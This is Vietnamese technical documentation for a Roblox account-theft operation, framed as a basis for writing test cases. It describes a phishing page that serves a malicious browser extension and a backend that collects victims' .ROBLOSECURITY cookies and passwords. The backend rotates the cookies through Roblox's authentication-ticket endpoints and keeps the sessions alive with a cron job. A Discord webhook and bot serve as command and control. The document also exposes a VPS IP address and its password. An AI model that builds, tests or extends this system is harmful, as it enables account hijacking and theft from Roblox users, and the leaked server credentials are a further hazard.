# Roblox Dupe Project - Technical Documentation & Business Logic (For Test Case)

Tài liệu này chi tiết hóa logic nghiệp vụ và kỹ thuật phục vụ cho việc xây dựng test case.

## 1. Kiến trúc hệ thống (Technical Stack)

* **Frontend:** Next.js (Client-side rendering cho UI, Server Actions cho xử lý file).
* **Backend:** Fastify (Node.js framework), Prisma (ORM), PostgreSQL.
* **Automation:** `node-cron` cho việc duy trì session.
* **Integration:** Discord.js (Slash Commands & Webhooks).

## 2. Chi tiết logic nghiệp vụ & Code Logic

### A. Giao diện Phishing (Frontend)

* **Vị trí:** `/frontend/src/app/page.tsx`
* **Logic:** Cung cấp nút tải tệp nén `extension.zip` từ `backend/public`.
* **Mục tiêu Test Case:** Xác nhận nút tải hoạt động, URL tải file chính xác (`/public/extension.zip`).

### B. Cơ chế Chiếm hữu Cookie (Cookie Rotation)

* **Vị trí:** `backend/dist/server.js` (Hàm `g` / `ie`)
* **Logic Code:**
    1. Nhận Cookie (`.ROBLOSECURITY`) từ request.
    2. Gọi `POST https://auth.roblox.com/v1/authentication-ticket` để lấy `x-csrf-token`.
    3. Gọi lại endpoint trên kèm token để lấy `rbx-authentication-ticket`.
    4. Gọi `POST https://auth.roblox.com/v1/authentication-ticket/redeem` kèm ticket để nhận Cookie mới từ tiêu đề `set-cookie`.
* **Mục tiêu Test Case:** Kiểm tra quy trình đổi Cookie (Success/Fail cases), kiểm tra việc xử lý lỗi khi Cookie hết hạn hoặc thiếu Token.

### C. Duy trì Session (Persistence & Scheduler)

* **Vị trí:** `backend/dist/server.js` (Hàm `A.run`)
* **Logic Code:**
  * Chạy định kỳ (Cron job `*/30 * * * *`).
  * Truy vấn Database tìm các session có `status: "ALIVE"` và `updatedAt < (now - 5 hours)`.
  * Tự động chạy hàm `W` để Refresh lại toàn bộ danh sách tìm được.
* **Mục tiêu Test Case:** Kiểm tra logic lọc tài khoản cần refresh, kiểm tra scheduler có chạy đúng thời gian, kiểm tra việc cập nhật trạng thái `updatedAt` sau khi refresh thành công.

### D. Hệ thống Discord (Command & Control)

* **Webhook (`S`, `p` functions):**
  * Gửi Embed message tới Discord khi có "Hit" mới hoặc cập nhật.
  * Gồm các trường: UserId, Cookie, Password, Status.
* **Bot Commands (`K` object):**
  * `/cookie`: Truy vấn DB lấy mã Cookie dựa trên `userId`.
  * `/refresh`: Gọi trực tiếp `A.run`.
  * `/alive`: Thống kê số lượng session có trạng thái `ALIVE`.
* **Mục tiêu Test Case:** Kiểm tra định dạng Webhook gửi đi, kiểm tra tính đúng đắn của các lệnh Slash Commands (phản hồi đúng dữ liệu, đúng định dạng).

## 3. Quy trình dữ liệu (Data Flow)

1. `Input`: `POST /api/sessions` (nhận Cookie từ Extension).
2. `Process`: `Rotate Cookie` (Lấy mã mới) -> `UPSERT` vào Database (Model `Session`).
3. `Output`: Gửi Webhook báo "NEW HIT" sang Discord.
4. `Maintenance`: Cron job định kỳ làm mới bản ghi trong Database.

## 4. Cấu trúc Dữ liệu (Prisma Schema)

* **Model `Session`:** `userId` (Unique), `cookie`, `status` (Enum: ALIVE, DIE, PAUSED), `updatedAt`.
* **Model `Auth`:** `userId`, `username`, `password`.

---

## 🚀 Quy trình Triển khai (Deployment)

Dự án sử dụng chiến lược **Fast Deploy**: Build sản phẩm tại máy Local và chỉ đẩy kết quả đã đóng gói lên VPS để restart.

### 1. Script tự động hóa: `deploy-production.ps1`

Nằm tại gốc dự án, script này thực hiện 4 bước liên hoàn:

1. **Build Frontend (Docker Local):** Sử dụng `Dockerfile.build` để tạo ra thư mục `.next` chuẩn.
2. **Đóng gói (Packaging):** Gom Frontend (đã build) và Backend (mã nguồn) vào một file `deploy.tar.gz`.
3. **Tải lên (Uploading):** Sử dụng SCP đẩy file nén lên root của VPS (`103.249.200.206`).
4. **Kích hoạt (Remote Exec):** SSH vào VPS, giải nén và `pm2 restart`.

### 2. Cách vận hành

Chuột phải vào tệp `deploy-production.ps1` -> **Run with PowerShell**.
> **Lưu ý:** Nếu VPS yêu cầu mật khẩu, hãy nhập: `y1725IZG`.

### 3. Ưu điểm vượt trội

- **Tốc độ:** Giảm thời gian deploy xuống chỉ còn ~1-2 phút (Thay vì 15-20 phút build trên VPS).
* **An toàn:** Không làm VPS bị treo RAM hoặc đầy ổ cứng khi build.
* **Tính nhất quán:** Đảm bảo code được vá (patch) tại local luôn khớp với production.

---
*Tài liệu này cung cấp các điểm chạm logic để người kiểm thử xây dựng bộ test case hệ thống.*
